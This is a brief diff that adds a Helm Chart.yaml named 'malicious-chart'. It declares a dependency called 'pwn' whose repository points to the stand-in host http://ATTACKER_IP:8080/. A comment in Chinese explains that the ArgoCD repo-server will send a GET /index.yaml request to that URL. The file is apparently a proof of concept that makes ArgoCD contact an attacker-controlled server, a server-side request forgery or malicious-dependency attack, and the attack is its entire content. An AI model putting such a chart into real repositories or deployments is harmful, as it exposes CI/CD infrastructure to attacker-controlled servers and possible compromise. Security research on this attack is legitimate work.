@@ -1,0 +1,8 @@
+apiVersion: v2
+name: malicious-chart
+version: 0.1.0
+dependencies:
+- name: pwn
+version: "0.1.0"
+repository: "http://ATTACKER_IP:8080/"
+# ArgoCD repo-server 会向此 URL 发 GET /index.yaml 请求
